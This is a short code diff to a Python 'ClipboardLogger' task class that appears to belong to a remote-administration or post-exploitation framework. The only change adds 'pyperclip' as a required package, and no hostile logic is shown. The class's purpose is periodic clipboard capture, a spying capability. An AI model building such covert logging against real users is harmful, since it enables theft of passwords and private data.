@@ -8,6 +8,7 @@ class ClipboardLogger(Task):
     administrator = {"win32": False, "linux": False, "darwin": False}
     kwargs = {"log_time": {"type": int, "description": "Logging time in seconds", "default": 900},
               "log_frequency": {"type": int, "description": "Delay between next clipboard checks", "default": 5}}
+    packages = ["pyperclip"]
 
     def __init__(self, task_id):
         super(ClipboardLogger, self).__init__(task_id)
